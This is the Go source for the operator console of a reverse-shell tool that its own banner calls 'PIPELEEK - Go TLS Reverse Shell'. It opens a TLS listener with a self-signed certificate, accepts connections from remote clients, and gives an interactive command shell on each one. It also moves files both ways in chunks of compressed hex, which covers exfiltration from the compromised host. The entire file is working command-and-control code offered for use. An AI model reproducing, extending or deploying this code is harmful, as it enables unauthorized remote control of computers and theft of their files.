package main

import (
	"crypto/tls"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	"github.com/peterh/liner"

	"golang-https-rev/pkg/certs"
	"golang-https-rev/pkg/compression"
	"golang-https-rev/pkg/protocol"
	"golang-https-rev/pkg/server"
	"golang-https-rev/pkg/version"
)

func printHeader() {
	fmt.Println()
	fmt.Println("  ██████╗  ██████╗ ████████╗███████╗")
	fmt.Println("  ██╔════╝ ██╔═══██╗╚══██╔══╝██╔════╝")
	fmt.Println("  ██║  ███╗██║   ██║   ██║   ███████╗")
	fmt.Println("  ██║   ██║██║   ██║   ██║   ╚════██║")
	fmt.Println("  ╚██████╔╝╚██████╔╝   ██║   ███████║")
	fmt.Println("   ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝")
	fmt.Println()
	fmt.Println("  PIPELEEK - Go TLS Reverse Shell")
	fmt.Println()
}

func main() {
	if err := runListener(os.Args[1:]); err != nil {
		log.Fatal(err)
	}
}

func runListener(args []string) error {
	printHeader()

	if len(args) != 2 {
		return fmt.Errorf("Usage: gotsl <port> <network-interface>")
	}

	port := args[0]
	networkInterface := args[1]

	log.Println("Generating self-signed certificate...")
	cert, err := certs.GenerateSelfSignedCert()
	if err != nil {
		return fmt.Errorf("failed to generate certificate: %w", err)
	}
	log.Println("Certificate generated successfully")

	log.Printf("Version: %s (commit %s, date %s)", version.Version, version.Commit, version.Date)

	// Create TLS config
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
	}

	// Create listener
	listener := server.NewListener(port, networkInterface, tlsConfig)
	netListener, err := listener.Start()
	if err != nil {
		return fmt.Errorf("failed to start listener: %w", err)
	}
	defer netListener.Close()

	log.Println("Listener ready. Waiting for connections...")
	interactiveShell(listener)
	return nil
}

type listenerInterface interface {
	GetClients() []string
	SendCommand(client, cmd string) error
	GetResponse(client string, timeout time.Duration) (string, error)
}

func interactiveShell(l *server.Listener) {
	line := liner.NewLiner()
	line.SetCtrlCAborts(true)
	defer line.Close()

	var currentClient string

	printHelp()

	for {
		prompt := "listener> "
		if currentClient != "" {
			prompt = fmt.Sprintf("shell[%s]> ", currentClient)
		}

		input, err := line.Prompt(prompt)
		if err != nil {
			if err == liner.ErrPromptAborted {
				fmt.Println()
				continue
			}
			return
		}

		input = strings.TrimSpace(input)
		if input == "" {
			continue
		}
		line.AppendHistory(input)

		parts := strings.Fields(input)
		command := parts[0]

		if currentClient == "" {
			switch command {
			case "ls", "dir":
				listClients(l)
			case "use":
				currentClient = useClient(l, parts)
			case "exit":
				return
			default:
				fmt.Printf("Unknown command: %s\n", command)
			}
		} else {
			if input == "bg" {
				fmt.Printf("Backgrounding session with %s\n", currentClient)
				currentClient = ""
				continue
			}

			if strings.HasPrefix(input, "upload ") {
				if !handleUpload(l, currentClient, parts) {
					currentClient = ""
				}
				continue
			}

			if strings.HasPrefix(input, "download ") {
				if !handleDownload(l, currentClient, parts) {
					currentClient = ""
				}
				continue
			}

			if !sendShellCommand(l, currentClient, input) {
				currentClient = ""
			}
		}
	}
}

func printHelp() {
	fmt.Println("\nCommands:")
	fmt.Println("  ls                   - List connected clients")
	fmt.Println("  use <client_id>      - Interact with a specific client")
	fmt.Println("  upload <l> <r>       - Upload local file <l> to remote path <r> (active session)")
	fmt.Println("  download <r> <l>     - Download remote file <r> to local path <l> (active session)")
	fmt.Println("  bg                   - Return to listener prompt from a session")
	fmt.Println("  exit                 - Exit the listener")
	fmt.Println()
}

func listClients(l listenerInterface) {
	clients := l.GetClients()
	if len(clients) == 0 {
		fmt.Println("No clients connected")
	} else {
		fmt.Println("\nConnected Clients:")
		for i, addr := range clients {
			fmt.Printf("  %d. %s\n", i+1, addr)
		}
		fmt.Println()
	}
}

func useClient(l listenerInterface, parts []string) string {
	if len(parts) < 2 {
		fmt.Println("Usage: use <client_id>")
		return ""
	}

	var numIdx int
	if _, err := fmt.Sscanf(parts[1], "%d", &numIdx); err != nil {
		fmt.Printf("Invalid client ID: %s\n", parts[1])
		return ""
	}

	clients := l.GetClients()
	if numIdx > 0 && numIdx <= len(clients) {
		selectedClient := clients[numIdx-1]
		fmt.Printf("Now interacting with: %s\n", selectedClient)
		fmt.Println("Type 'bg' to return to listener prompt")
		return selectedClient
	}

	fmt.Println("Client not found")
	return ""
}

func handleUpload(l listenerInterface, currentClient string, parts []string) bool {
	if len(parts) != 3 {
		fmt.Println("Usage: upload <local_path> <remote_path>")
		return true
	}

	localPath, remotePath := parts[1], parts[2]
	data, err := os.ReadFile(localPath)
	if err != nil {
		fmt.Printf("Error reading local file: %v\n", err)
		return true
	}

	compressed, err := compression.CompressToHex(data)
	if err != nil {
		fmt.Printf("Error compressing file: %v\n", err)
		return true
	}

	totalSize := len(compressed)
	startCmd := fmt.Sprintf("%s %s %d", protocol.CmdStartUpload, remotePath, totalSize)
	if err := l.SendCommand(currentClient, startCmd); err != nil {
		fmt.Printf("Error starting upload: %v\n", err)
		return false
	}

	resp, err := l.GetResponse(currentClient, 30*time.Second)
	if err != nil {
		fmt.Printf("Error getting start upload response: %v\n", err)
		return false
	}
	if !strings.Contains(resp, "OK") {
		fmt.Printf("Error starting upload: unexpected response: %s\n", strings.TrimSpace(strings.ReplaceAll(resp, protocol.EndOfOutputMarker, "")))
		return false
	}

	chunkNum := 0
	for i := 0; i < totalSize; i += protocol.ChunkSize {
		end := i + protocol.ChunkSize
		if end > totalSize {
			end = totalSize
		}
		chunk := compressed[i:end]
		chunkNum++
		chunkCmd := fmt.Sprintf("%s %s", protocol.CmdUploadChunk, chunk)
		if err := l.SendCommand(currentClient, chunkCmd); err != nil {
			fmt.Printf("Error sending upload chunk: %v\n", err)
			return false
		}
		resp, err := l.GetResponse(currentClient, 30*time.Second)
		if err != nil {
			fmt.Printf("Error getting chunk response: %v\n", err)
			return false
		}
		if !strings.Contains(resp, "OK") {
			cleanResp := strings.TrimSpace(strings.ReplaceAll(resp, protocol.EndOfOutputMarker, ""))
			fmt.Printf("Chunk upload error: %s\n", cleanResp)
			return false
		}
		fmt.Printf("Uploaded chunk %d: %d bytes\n", chunkNum, len(chunk))
	}

	endCmd := fmt.Sprintf("%s %s", protocol.CmdEndUpload, remotePath)
	if err := l.SendCommand(currentClient, endCmd); err != nil {
		fmt.Printf("Error ending upload: %v\n", err)
		return false
	}

	resp, err = l.GetResponse(currentClient, 30*time.Second)
	if err != nil {
		fmt.Printf("Error getting upload response: %v\n", err)
		return false
	}

	clean := strings.ReplaceAll(resp, protocol.EndOfOutputMarker, "")
	fmt.Print(clean)
	if !strings.HasSuffix(clean, "\n") {
		fmt.Println()
	}
	fmt.Printf("Total uploaded: %d bytes (original), %d bytes (compressed)\n", len(data), totalSize)
	return true
}

func handleDownload(l listenerInterface, currentClient string, parts []string) bool {
	if len(parts) != 3 {
		fmt.Println("Usage: download <remote_path> <local_path>")
		return true
	}

	remotePath, localPath := parts[1], parts[2]
	cmd := fmt.Sprintf("%s %s", protocol.CmdDownload, remotePath)
	if err := l.SendCommand(currentClient, cmd); err != nil {
		fmt.Printf("Error sending download: %v\n", err)
		return false
	}

	resp, err := l.GetResponse(currentClient, 5000000000)
	if err != nil {
		fmt.Printf("Error getting download response: %v\n", err)
		return false
	}

	clean := strings.ReplaceAll(resp, protocol.EndOfOutputMarker, "")
	clean = strings.TrimSpace(clean)
	if !strings.HasPrefix(clean, protocol.DataPrefix) {
		fmt.Printf("Unexpected download response (length %d bytes)\n", len(clean))
		return true
	}

	payload := strings.TrimPrefix(clean, protocol.DataPrefix)
	decoded, err := compression.DecompressHex(payload)
	if err != nil {
		fmt.Printf("Error decoding payload: %v\n", err)
		return true
	}

	if err := os.WriteFile(localPath, decoded, 0644); err != nil {
		fmt.Printf("Error writing local file: %v\n", err)
		return true
	}

	fmt.Printf("Downloaded %d bytes to %s\n", len(decoded), localPath)
	return true
}

func sendShellCommand(l listenerInterface, currentClient, input string) bool {
	if err := l.SendCommand(currentClient, input); err != nil {
		fmt.Printf("Error sending command: %v\n", err)
		return false
	}

	resp, err := l.GetResponse(currentClient, 5000000000)
	if err != nil {
		fmt.Printf("Error getting response: %v\n", err)
		return false
	}

	clean := strings.ReplaceAll(resp, protocol.EndOfOutputMarker, "")
	fmt.Print(clean)
	if !strings.HasSuffix(clean, "\n") {
		fmt.Println()
	}
	return true
}
